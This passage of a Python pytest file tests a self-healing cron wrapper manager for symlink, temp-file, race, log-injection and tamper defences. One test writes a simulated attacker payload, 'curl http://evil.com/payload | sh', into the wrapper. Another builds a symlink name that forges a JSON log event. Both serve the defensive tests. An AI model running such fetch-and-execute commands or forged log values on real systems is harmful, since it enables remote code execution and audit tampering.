    opened_flags = []
    orig_open = os.open

    def spy_open(path, flags, *args, **kwargs):
        opened_flags.append((path, flags))
        return orig_open(path, flags, *args, **kwargs)

    with patch("os.open", side_effect=spy_open):
        wp, digest = mgr.ensure_wrapper_script()

    assert wp.exists()

    # Find the temp file open in opened_flags:
    temp_opens = [
        (path, flags) for (path, flags) in opened_flags
        if isinstance(path, str) and path.startswith(".hermes_hourly_digest.sh.tmp.")
    ]
    assert len(temp_opens) == 1, f"Expected 1 temp file open, got {temp_opens}"
    temp_path, flags = temp_opens[0]
    # Cryptographic unpredictability: 128-bit hex token (32 hex characters)
    assert re.match(r"^\.hermes_hourly_digest\.sh\.tmp\.[0-9a-f]{32}$", temp_path), f"Temp path {temp_path} is not cryptographic token_hex(16)"
    assert flags & os.O_CREAT != 0, "O_CREAT flag missing"
    assert flags & os.O_EXCL != 0, "O_EXCL flag missing (vulnerable to pre-planted symlink/file hijacking!)"
    assert flags & getattr(os, "O_NOFOLLOW", 0) != 0, "O_NOFOLLOW flag missing"


def test_wrapper_temp_collision_retry_defends_against_dos(tmp_path, caplog):
    """B1 / B2: Cryptographic unpredictability and bounded retries defeat pre-planted collision DoS."""
    SelfHealingManager.reset_circuit_breaker()
    import logging
    scripts_dir = tmp_path / "scripts_dos_test"
    scripts_dir.mkdir(parents=True, exist_ok=True)

    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    planted_token = "a" * 32
    fresh_token = "b" * 32
    planted_file = scripts_dir / f".hermes_hourly_digest.sh.tmp.{planted_token}"
    planted_file.write_text("PRE_PLANTED_COLLISION_DATA", encoding="utf-8")

    # First attempt draws colliding token, second attempt draws fresh token
    tokens = [planted_token, fresh_token, "c" * 32, "d" * 32]

    with caplog.at_level(logging.WARNING):
        with patch("secrets.token_hex", side_effect=tokens):
            wp, digest = mgr.ensure_wrapper_script()

    # Self-healing succeeded despite the pre-planted collision!
    assert wp.exists()
    assert planted_file.read_text(encoding="utf-8") == "PRE_PLANTED_COLLISION_DATA"

    # SIEM telemetry verified: caught collision and retried
    retry_records = [
        json.loads(r.message) for r in caplog.records
        if "temp_collision_retry" in r.message
    ]
    assert len(retry_records) >= 1
    assert retry_records[0]["event"] == "temp_collision_retry"
    assert retry_records[0]["attempt"] == 1


def test_wrapper_temp_exhaustion_fails_closed_and_emits_siem_event(tmp_path, caplog):
    """B1 / B2: Persistent collisions fail closed after max_retries with SIEM audit log."""
    SelfHealingManager.reset_circuit_breaker()
    import logging
    scripts_dir = tmp_path / "scripts_exhaust_test"
    scripts_dir.mkdir(parents=True, exist_ok=True)

    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    # Force continuous collision by returning a fixed token
    colliding_token = "f" * 32
    planted_file = scripts_dir / f".hermes_hourly_digest.sh.tmp.{colliding_token}"
    planted_file.write_text("PRE_PLANTED_WALL", encoding="utf-8")

    with caplog.at_level(logging.ERROR):
        with patch("secrets.token_hex", return_value=colliding_token):
            with pytest.raises(FileExistsError):
                mgr.ensure_wrapper_script()

    # Pre-planted file was never overwritten
    assert planted_file.read_text(encoding="utf-8") == "PRE_PLANTED_WALL"

    # Verified SIEM audit record
    exhaust_records = [
        json.loads(r.message) for r in caplog.records
        if "temp_create_exhausted" in r.message
    ]
    assert len(exhaust_records) == 1
    assert exhaust_records[0]["event"] == "temp_create_exhausted"
    assert exhaust_records[0]["max_retries"] == SelfHealingManager.TEMP_MAX_RETRIES


def test_circuit_breaker_thread_safety():
    """B3 / CWE-362: Circuit breaker state mutation is serialized across concurrent threads."""
    import concurrent.futures
    SelfHealingManager.reset_circuit_breaker()

    status = SelfHealingManager.get_circuit_status()
    assert status["failures"] == 0
    assert not status["is_open"]

    def trip_breaker():
        with SelfHealingManager._circuit_lock:
            SelfHealingManager._wrapper_failures += 1
            if SelfHealingManager._wrapper_failures >= SelfHealingManager.CIRCUIT_MAX_FAILURES:
                SelfHealingManager._wrapper_circuit_open_until = time.time() + SelfHealingManager.CIRCUIT_COOLDOWN_SECONDS

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        futures = [executor.submit(trip_breaker) for _ in range(10)]
        concurrent.futures.wait(futures)

    status_after = SelfHealingManager.get_circuit_status()
    assert status_after["failures"] == 10
    assert status_after["is_open"] is True

    SelfHealingManager.reset_circuit_breaker()
    status_reset = SelfHealingManager.get_circuit_status()
    assert status_reset["failures"] == 0
    assert status_reset["is_open"] is False


def test_scripts_dir_mode_and_ownership_hardening(tmp_path):
    """B4 / A4: scripts_dir with permissive mode (0o777) must be hardened to 0o700."""
    SelfHealingManager.reset_circuit_breaker()
    permissive_dir = tmp_path / "permissive_scripts"
    permissive_dir.mkdir(mode=0o777, parents=True, exist_ok=True)
    os.chmod(permissive_dir, 0o777)
    assert (permissive_dir.stat().st_mode & 0o077) != 0

    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=permissive_dir,
    )
    wp, _ = mgr.ensure_wrapper_script()
    assert wp.exists()
    # Directory permissions must now be 0o700 (no group or world bits)
    st = permissive_dir.stat()
    assert (st.st_mode & 0o077) == 0


def test_scripts_dir_alien_ownership_refused(tmp_path):
    """B4 / A4: scripts_dir owned by another UID must be refused with PermissionError, not chmodded."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "alien_scripts"
    scripts_dir.mkdir(parents=True, exist_ok=True)

    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    orig_fstat = os.fstat

    def alien_fstat(fd):
        real_st = orig_fstat(fd)
        class FakeStat:
            pass
        st = FakeStat()
        for attr in ("st_mode", "st_ino", "st_dev", "st_nlink", "st_gid", "st_size", "st_atime", "st_mtime", "st_ctime"):
            setattr(st, attr, getattr(real_st, attr, 0))
        st.st_uid = os.geteuid() + 1000  # Alien UID
        return st

    with patch("os.fstat", side_effect=alien_fstat):
        with pytest.raises(PermissionError, match="scripts_dir not owned by current user"):
            mgr.ensure_wrapper_script()


def test_audit_event_resists_log_injection(tmp_path, caplog):
    """B5 / A5: Component name containing newlines and forged JSON must be escaped cleanly by json.dumps."""
    SelfHealingManager.reset_circuit_breaker()
    import logging
    real_dir = tmp_path / "real_target"
    real_dir.mkdir(parents=True, exist_ok=True)
    symlink_evil = tmp_path / "symlink\n{\"event\":\"forged_fake_pass\"}"
    symlink_evil.symlink_to(real_dir, target_is_directory=True)
    nested_scripts_dir = symlink_evil / "scripts"

    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=nested_scripts_dir,
    )

    with caplog.at_level(logging.ERROR):
        with pytest.raises(RuntimeError, match="symlink, refusing"):
            mgr.ensure_wrapper_script()

    refused_records = []
    for record in caplog.records:
        try:
            parsed = json.loads(record.message)
            if parsed.get("event") == "scripts_dir_symlink_refused":
                refused_records.append(parsed)
            # DOWNSTREAM SIEM AUDIT GUARD: prove that no record has the forged event
            assert parsed.get("event") != "forged_fake_pass", "SIEM forgery detected: inner JSON escaped into top-level event!"
        except json.JSONDecodeError:
            pytest.fail(f"Log message is not valid JSON: {record.message}")

    assert len(refused_records) == 1
    rec = refused_records[0]
    assert rec["event"] == "scripts_dir_symlink_refused"
    assert "forged_fake_pass" in rec["component"]
    assert "\n" in rec["component"]


def test_wrapper_manifest_pinned_execution(tmp_path):
    """A6 / Manifest-Pinned Execution: Bash wrapper validates companion manifest before executing."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts"
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )
    wp, digest = mgr.ensure_wrapper_script()

    manifest_file = scripts_dir / ".hermes_hourly_digest.sh.manifest"
    assert manifest_file.exists()
    assert (manifest_file.stat().st_mode & 0o777) == 0o600
    manifest_content = manifest_file.read_text(encoding="utf-8")
    assert digest in manifest_content
    assert "hermes_hourly_digest.sh" in manifest_content

    # Behavioral test: sha256sum verification passes on untampered script
    res = subprocess.run(["sha256sum", "-c", str(manifest_file), "--status"], cwd=scripts_dir)
    assert res.returncode == 0

    # Tampering with wrapper causes sha256sum verification to fail
    with open(wp, "a", encoding="utf-8") as f:
        f.write("# unauthorized modification\n")

    res_tampered = subprocess.run(["sha256sum", "-c", str(manifest_file), "--status"], cwd=scripts_dir)
    assert res_tampered.returncode != 0


def test_wrapper_failure_cleans_up_temp_and_trips_circuit_breaker(tmp_path):
    """Counterfactual outage test: failure during rename unlinks temp file and trips circuit breaker after 3 attempts."""
    SelfHealingManager.reset_circuit_breaker()
    import errno
    scripts_dir = tmp_path / "scripts_enospc"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    # Inject ENOSPC on os.replace
    orig_replace = os.replace

    def enospc_replace(src, dst, *args, **kwargs):
        raise OSError(errno.ENOSPC, "No space left on device")

    with patch("os.replace", side_effect=enospc_replace):
        # Attempt 1: fails with ENOSPC
        with pytest.raises(OSError, match="No space left on device"):
            mgr.ensure_wrapper_script()
        # Verify no orphaned temp files left in scripts_dir
        temp_files_1 = [f.name for f in scripts_dir.iterdir() if f.name.startswith(".hermes_hourly_digest.sh.tmp.")]
        assert len(temp_files_1) == 0, f"Orphaned temp files left behind after failure: {temp_files_1}"

        # Attempt 2: fails with ENOSPC
        with pytest.raises(OSError, match="No space left on device"):
            mgr.ensure_wrapper_script()

        # Attempt 3: fails with ENOSPC -> trips circuit breaker
        with pytest.raises(OSError, match="No space left on device"):
            mgr.ensure_wrapper_script()

    # Attempt 4 (circuit breaker open): refuses immediately without attempting filesystem I/O
    with pytest.raises(RuntimeError, match="Wrapper reconciliation circuit breaker OPEN"):
        mgr.ensure_wrapper_script()

    # Reset circuit breaker restores normal operation
    SelfHealingManager.reset_circuit_breaker()
    wp, _ = mgr.ensure_wrapper_script()
    assert wp.exists()


def test_wrapper_temp_fatal_errno_does_not_retry(tmp_path, caplog):
    """CWE-377 / DoS Defense: Fatal errno (ENOSPC) must fail immediately on attempt 1 without retrying."""
    SelfHealingManager.reset_circuit_breaker()
    import errno
    import logging
    scripts_dir = tmp_path / "scripts_fatal_errno"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    temp_attempts = []
    orig_open = os.open

    def enospc_temp_open(path, flags, *args, **kwargs):
        if isinstance(path, str) and path.startswith(".hermes_hourly_digest.sh.tmp."):
            temp_attempts.append(path)
            raise OSError(errno.ENOSPC, "No space left on device")
        return orig_open(path, flags, *args, **kwargs)

    with caplog.at_level(logging.ERROR):
        with patch("os.open", side_effect=enospc_temp_open):
            with pytest.raises(OSError, match="No space left on device"):
                mgr.ensure_wrapper_script()

    # CRITICAL: exactly 1 attempt! No futile retries on ENOSPC
    assert len(temp_attempts) == 1, f"Expected exactly 1 attempt on ENOSPC, got {len(temp_attempts)} (amplification DoS detected!)"

    # SIEM telemetry verified: emitted fatal errno record
    fatal_records = [
        json.loads(r.message) for r in caplog.records
        if "temp_create_fatal_errno" in r.message
    ]
    assert len(fatal_records) == 1
    assert fatal_records[0]["event"] == "temp_create_fatal_errno"
    assert fatal_records[0]["errno"] == errno.ENOSPC
    assert fatal_records[0]["attempt"] == 1


def test_wrapper_refuses_without_nofollow(tmp_path):
    """CWE-59 Fail-Closed: System must refuse operation if platform lacks O_NOFOLLOW."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts_no_nofollow"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    # Monkeypatch away os.O_NOFOLLOW
    with patch.object(os, "O_NOFOLLOW", None, create=True):
        with pytest.raises(RuntimeError, match="O_NOFOLLOW unavailable on this platform; refusing to inspect scripts without symlink protection"):
            mgr.ensure_wrapper_script()


def test_entropy_draw_count_is_bounded(tmp_path):
    """Entropy Contract: Clean creation consumes exactly 2 cryptographic draws (1 wrapper, 1 manifest)."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts_entropy_contract"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    draws = []
    orig_token = mgr._token_source

    def spy_token(nbytes=16):
        res = orig_token(nbytes)
        draws.append(res)
        return res

    with patch.object(mgr, "_token_source", side_effect=spy_token):
        wp, digest = mgr.ensure_wrapper_script()

    assert wp.exists()
    # Guarantee spy actually fired!
    assert len(draws) > 0, "Entropy spy did not fire at all!"
    # Exactly 2 draws on happy path: 1 for wrapper temp, 1 for manifest temp
    assert len(draws) == 2, f"Expected exactly 2 entropy draws on initial creation, got {len(draws)}: {draws}"


def test_atomic_publish_uses_os_replace(tmp_path):
    """CWE-494: Wrapper publication must use atomic os.replace."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts_atomic_replace"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    replace_calls = []
    orig_replace = os.replace

    def spy_replace(src, dst, *args, **kwargs):
        replace_calls.append((src, dst))
        return orig_replace(src, dst, *args, **kwargs)

    with patch("os.replace", side_effect=spy_replace):
        wp, digest = mgr.ensure_wrapper_script()

    # Both wrapper and manifest must be published via os.replace
    assert len(replace_calls) == 2
    wrapper_replaces = [dst for (src, dst) in replace_calls if dst == "hermes_hourly_digest.sh"]
    manifest_replaces = [dst for (src, dst) in replace_calls if dst == ".hermes_hourly_digest.sh.manifest"]
    assert len(wrapper_replaces) == 1
    assert len(manifest_replaces) == 1


def test_breaker_no_double_open_under_contention(tmp_path):
    """CWE-362: Concurrent contention across threads trips circuit breaker cleanly once."""
    SelfHealingManager.reset_circuit_breaker()
    import concurrent.futures
    import errno

    scripts_dir = tmp_path / "scripts_contention"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    def failing_replace(*args, **kwargs):
        raise OSError(errno.ENOSPC, "Contention injected error")

    with patch("os.replace", side_effect=failing_replace):
        def worker_task():
            try:
                mgr.ensure_wrapper_script()
                return "SUCCESS"
            except Exception as e:
                return str(e)

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            results = list(executor.map(lambda _: worker_task(), range(10)))

    # Circuit breaker must be open
    status = SelfHealingManager.get_circuit_status()
    assert status["is_open"] is True
    assert status["failures"] >= SelfHealingManager.CIRCUIT_MAX_FAILURES


def test_publish_is_recoverable_after_crash_between_replaces(tmp_path):
    """CWE-494 / Crash Transactionality: Interruption between wrapper and manifest replaces recovers cleanly."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts_crash_recovery"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    orig_replace = os.replace

    class SimulatedCrash(RuntimeError):
        pass

    # Inject crash right after wrapper replace succeeds, but before manifest replace
    def crash_after_wrapper_replace(src, dst, *args, **kwargs):
        res = orig_replace(src, dst, *args, **kwargs)
        if dst == "hermes_hourly_digest.sh":
            raise SimulatedCrash("Process killed / power outage between replaces")
        return res

    # Initial execution crashes
    with patch("os.replace", side_effect=crash_after_wrapper_replace):
        with pytest.raises(SimulatedCrash):
            mgr.ensure_wrapper_script()

    # Disk state post-crash: wrapper exists on disk, manifest does NOT exist!
    wrapper_path = scripts_dir / "hermes_hourly_digest.sh"
    manifest_path = scripts_dir / ".hermes_hourly_digest.sh.manifest"
    assert wrapper_path.exists(), "Wrapper script must exist after first replace"
    assert not manifest_path.exists(), "Manifest must NOT exist yet after simulated crash"

    # Reset circuit breaker (to simulate a new process run)
    SelfHealingManager.reset_circuit_breaker()

    # Subsequent run detects canonical wrapper and self-heals the manifest without error
    wp, digest = mgr.ensure_wrapper_script()
    assert wp.exists()
    assert manifest_path.exists(), "Manifest must be self-healed by subsequent run"

    # Verify sha256sum integrity check passes
    res = subprocess.run(
        ["sha256sum", "-c", manifest_path.name],
        cwd=scripts_dir,
        capture_output=True,
        text=True,
    )
    assert res.returncode == 0, f"sha256sum verification failed: {res.stderr}"

    # Breaker must remain CLOSED and healthy
    status = SelfHealingManager.get_circuit_status()
    assert status["is_open"] is False


@pytest.mark.parametrize(
    "err_code, err_name",
    [
        (errno.ENOSPC, "ENOSPC"),
        (getattr(errno, "EDQUOT", 122), "EDQUOT"),
        (errno.EROFS, "EROFS"),
        (errno.EACCES, "EACCES"),
    ],
)
def test_wrapper_temp_fatal_errno_siblings(tmp_path, caplog, err_code, err_name):
    """CWE-377 / DoS Defense: Fatal errno siblings must fail immediately on attempt 1 without retrying."""
    SelfHealingManager.reset_circuit_breaker()
    import logging
    scripts_dir = tmp_path / f"scripts_fatal_{err_name}"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    temp_attempts = []
    orig_open = os.open

    def fatal_temp_open(path, flags, *args, **kwargs):
        if isinstance(path, str) and path.startswith(".hermes_hourly_digest.sh.tmp."):
            temp_attempts.append(path)
            raise OSError(err_code, f"Injected fatal errno {err_name}")
        return orig_open(path, flags, *args, **kwargs)

    with caplog.at_level(logging.ERROR):
        with patch("os.open", side_effect=fatal_temp_open):
            with pytest.raises(OSError, match=f"Injected fatal errno {err_name}"):
                mgr.ensure_wrapper_script()

    # CRITICAL: exactly 1 attempt! No futile retries on fatal errno
    assert len(temp_attempts) == 1, f"Expected exactly 1 attempt on {err_name}, got {len(temp_attempts)}"

    # SIEM telemetry verified: emitted fatal errno record
    fatal_records = [
        json.loads(r.message)
        for r in caplog.records
        if "temp_create_fatal_errno" in r.message
    ]
    assert len(fatal_records) == 1
    assert fatal_records[0]["event"] == "temp_create_fatal_errno"
    assert fatal_records[0]["errno"] == err_code
    assert fatal_records[0]["attempt"] == 1


def test_wrapper_refuses_without_nofollow_delattr(tmp_path, monkeypatch):
    """CWE-59 Fail-Closed: System must refuse operation if os.O_NOFOLLOW is deleted via delattr."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts_delattr_nofollow"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    monkeypatch.delattr(os, "O_NOFOLLOW", raising=False)
    with pytest.raises(RuntimeError, match="O_NOFOLLOW unavailable on this platform"):
        mgr.ensure_wrapper_script()


def test_breaker_lock_not_held_across_io(tmp_path):
    """Concurrency Invariant: _circuit_lock must NOT be held during blocking filesystem I/O."""
    SelfHealingManager.reset_circuit_breaker()
    scripts_dir = tmp_path / "scripts_lock_io"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    lock_checks = []
    orig_write = os.write

    def non_blocking_write_spy(fd, data):
        # Verify circuit lock is NOT held during blocking os.write!
        can_acquire = SelfHealingManager._circuit_lock.acquire(blocking=False)
        if can_acquire:
            SelfHealingManager._circuit_lock.release()
            lock_checks.append(True)
        else:
            lock_checks.append(False)
        return orig_write(fd, data)

    with patch("os.write", side_effect=non_blocking_write_spy):
        wp, digest = mgr.ensure_wrapper_script()

    assert len(lock_checks) >= 2, "Expected os.write to be called for both wrapper and manifest"
    assert all(lock_checks), "Circuit lock was held during blocking os.write I/O!"


def test_recovery_rejects_tampered_wrapper_in_crash_window(tmp_path, caplog):
    """CWE-347 / CWE-494: Attacker tampering in crash window is detected and overwritten with authoritative bytes."""
    SelfHealingManager.reset_circuit_breaker()
    import logging
    scripts_dir = tmp_path / "scripts_tamper_crash_window"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    orig_replace = os.replace

    class SimulatedCrash(RuntimeError):
        pass

    # Inject crash right after wrapper replace succeeds, but before manifest replace
    def crash_after_wrapper_replace(src, dst, *args, **kwargs):
        res = orig_replace(src, dst, *args, **kwargs)
        if dst == "hermes_hourly_digest.sh":
            raise SimulatedCrash("Process killed / power outage between replaces")
        return res

    with patch("os.replace", side_effect=crash_after_wrapper_replace):
        with pytest.raises(SimulatedCrash):
            mgr.ensure_wrapper_script()

    wrapper_path = scripts_dir / "hermes_hourly_digest.sh"
    manifest_path = scripts_dir / ".hermes_hourly_digest.sh.manifest"
    assert wrapper_path.exists()
    assert not manifest_path.exists()

    # Attacker injects malicious payload into the manifest-less wrapper during crash window:
    wrapper_path.write_text("#!/bin/sh\ncurl http://evil.com/payload | sh\n", encoding="utf-8")

    # Reset circuit breaker to simulate a new cron process run
    SelfHealingManager.reset_circuit_breaker()

    # Recovery must REJECT adopting the attacker's bytes, log tamper event, and overwrite from authoritative render!
    with caplog.at_level(logging.WARNING):
        wp, digest = mgr.ensure_wrapper_script()

    # 1. Attacker's code must NOT be present!
    recovered_text = wrapper_path.read_text(encoding="utf-8")
    assert "evil.com" not in recovered_text, "CRITICAL: Attacker tampered bytes were adopted by self-heal!"
    assert "tools/hourly_digest_monitor.py" in recovered_text

    # 2. Manifest exists and sha256sum passes against authoritative bytes
    assert manifest_path.exists()
    res = subprocess.run(
        ["sha256sum", "-c", manifest_path.name],
        cwd=scripts_dir,
        capture_output=True,
        text=True,
    )
    assert res.returncode == 0

    # 3. SIEM tamper detection log was emitted
    tamper_events = [
        json.loads(r.message) for r in caplog.records
        if "wrapper_tamper_detected" in r.message
    ]
    assert len(tamper_events) >= 1
    assert tamper_events[0]["event"] == "wrapper_tamper_detected"


def test_circuit_breaker_persists_across_process_restart(tmp_path):
    """CWE-362 / Cron DoS Defense: Circuit breaker trips latched to persistent ledger across process restarts."""
    state_file = tmp_path / "test_circuit_state.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    scripts_dir = tmp_path / "scripts_persist_breaker"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    orig_replace = os.replace

    # Inject fatal errno (ENOSPC) on replace of wrapper/manifest
    def failing_replace(src, dst, *args, **kwargs):
        dst_path = Path(dst)
        if dst_path.resolve().parent == state_file.resolve().parent and (
            dst_path.name.startswith(state_file.name) or dst_path.name.startswith(f".{state_file.name}")
        ):
            return orig_replace(src, dst, *args, **kwargs)
        raise OSError(errno.ENOSPC, "Persistent disk full error")

    with patch("os.replace", side_effect=failing_replace):
        for _ in range(SelfHealingManager.CIRCUIT_MAX_FAILURES):
            with pytest.raises(OSError, match="Persistent disk full error"):
                mgr.ensure_wrapper_script()

    # Verify persistent ledger file was created on disk
    assert state_file.exists(), "Persistent circuit state file was not created on disk!"
    with open(state_file, "r", encoding="utf-8") as fh:
        saved_state = json.load(fh)
    assert saved_state["errno"] == errno.ENOSPC
    assert saved_state["circuit_open_until"] > time.time()

    # Simulate a BRAND NEW process invocation (memory reset, fresh instance)
    with SelfHealingManager._circuit_lock:
        SelfHealingManager._wrapper_failures = 0
        SelfHealingManager._wrapper_circuit_open_until = 0.0
        SelfHealingManager._wrapper_circuit_open_until_mono = 0.0
        SelfHealingManager._wrapper_circuit_reason = None

    new_mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    # Must immediately refuse with circuit breaker OPEN from persistent ledger without touching disk
    with pytest.raises(RuntimeError, match="Wrapper reconciliation circuit breaker OPEN.*persistent failure"):
        new_mgr.ensure_wrapper_script()

    # Reset cleans up persistent ledger and restores execution
    SelfHealingManager.reset_circuit_breaker()
    assert not state_file.exists()
    wp, _ = new_mgr.ensure_wrapper_script()
    assert wp.exists()

    # Clean up static path override
    SelfHealingManager.set_circuit_state_file(None)


def test_token_source_is_csprng_default():
    """CWE-330: _token_source defaults to high-entropy cryptographic CSPRNG secrets.token_hex."""
    t1 = SelfHealingManager._token_source(16)
    t2 = SelfHealingManager._token_source(16)
    assert len(t1) == 32
    assert len(t2) == 32
    assert t1 != t2
    # Verify hex format
    assert re.fullmatch(r"[0-9a-f]{32}", t1) is not None
    assert re.fullmatch(r"[0-9a-f]{32}", t2) is not None


def test_poisoned_ledger_clamps_window_and_logs_siem_event(tmp_path, caplog):
    """CWE-20 / CWE-377: Attacker writing far-future timestamp (9e18) is clamped to _MAX_CIRCUIT_WINDOW_S and emits SIEM event."""
    import logging
    state_file = tmp_path / "poisoned_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    # Poison the ledger with 9e18 (far future epoch timestamp)
    poisoned_state = {
        "tripped_at": time.time(),
        "circuit_open_until": 9e18,
        "failures": 3,
        "reason": "malicious far-future timestamp injection",
    }
    state_file.write_text(json.dumps(poisoned_state), encoding="utf-8")

    scripts_dir = tmp_path / "scripts_poison"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    with caplog.at_level(logging.WARNING):
        status = SelfHealingManager.get_circuit_status()

    # 1. Breaker is open
    assert status["is_open"] is True
    # 2. Window is clamped to <= _MAX_CIRCUIT_WINDOW_S (900.0s), NOT 9e18!
    assert status["cooldown_remaining"] <= SelfHealingManager._MAX_CIRCUIT_WINDOW_S
    assert status["cooldown_remaining"] > 0.0

    # 3. SIEM audit event 'circuit_ledger_window_clamped' was logged
    clamp_events = [
        json.loads(r.message) for r in caplog.records
        if "circuit_ledger_window_clamped" in r.message
    ]
    assert len(clamp_events) >= 1
    assert clamp_events[0]["event"] == "circuit_ledger_window_clamped"
    assert clamp_events[0]["raw_open_until"] == 9e18
    assert clamp_events[0]["max_window_s"] == SelfHealingManager._MAX_CIRCUIT_WINDOW_S

    # 4. ensure_wrapper_script raises with clamped cooldown, not 9e18
    with pytest.raises(RuntimeError) as exc_info:
        mgr.ensure_wrapper_script()
    assert "Wrapper reconciliation circuit breaker OPEN" in str(exc_info.value)
    match = re.search(r"cooling down for (\d+)s", str(exc_info.value))
    assert match is not None
    assert int(match.group(1)) <= int(SelfHealingManager._MAX_CIRCUIT_WINDOW_S)

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


def test_corrupt_ledger_applies_conservative_hold_and_emits_siem_event(tmp_path, caplog):
    """CWE-20 / CWE-754: Corrupt/truncated JSON in persistent ledger triggers bounded conservative hold (30s) and emits SIEM event."""
    import logging
    state_file = tmp_path / "corrupt_ledger.json"
    SelfHealingManager.set_circuit_state_file(state_file)
    SelfHealingManager.reset_circuit_breaker()

    # Corrupt JSON syntax
    state_file.write_text("{invalid json garbage: missing quotes", encoding="utf-8")

    scripts_dir = tmp_path / "scripts_corrupt"
    scripts_dir.mkdir(parents=True, exist_ok=True)
    mgr = SelfHealingManager(
        jobs_path=tmp_path / "jobs.json",
        repo_dir=tmp_path / "repo",
        scripts_dir=scripts_dir,
    )

    with caplog.at_level(logging.WARNING):
        status = SelfHealingManager.get_circuit_status()

    # Breaker must apply conservative hold (is_open is True)
    assert status["is_open"] is True
    assert 0.0 < status["cooldown_remaining"] <= SelfHealingManager._CORRUPT_FAILSAFE_HOLD_S
    assert "corrupt_ledger_hold" in (status["reason"] or "")

    # Poison must be quarantined away from state_file
    assert not state_file.exists()
    assert any("corrupt" in p.name for p in tmp_path.iterdir())

    # SIEM audit event 'circuit_ledger_corrupt' was logged
    corrupt_events = [
        json.loads(r.message) for r in caplog.records
        if "circuit_ledger_corrupt" in r.message
    ]
    assert len(corrupt_events) >= 1
    assert corrupt_events[0]["event"] == "circuit_ledger_corrupt"
    assert corrupt_events[0]["hold_s"] == SelfHealingManager._CORRUPT_FAILSAFE_HOLD_S
    assert corrupt_events[0]["quarantined"] is True

    # ensure_wrapper_script raises RuntimeError during conservative hold
    with pytest.raises(RuntimeError, match="Wrapper reconciliation circuit breaker OPEN.*corrupt_ledger_hold"):
        mgr.ensure_wrapper_script()

    # Explicit reset_circuit_breaker clears ledger and unblocks self-healing
    SelfHealingManager.reset_circuit_breaker()
    assert not state_file.exists()
    status_after_reset = SelfHealingManager.get_circuit_status()
    assert status_after_reset["is_open"] is False
    assert status_after_reset["cooldown_remaining"] == 0.0

    wp, _ = mgr.ensure_wrapper_script()
    assert wp.exists()

    SelfHealingManager.reset_circuit_breaker()
    SelfHealingManager.set_circuit_state_file(None)


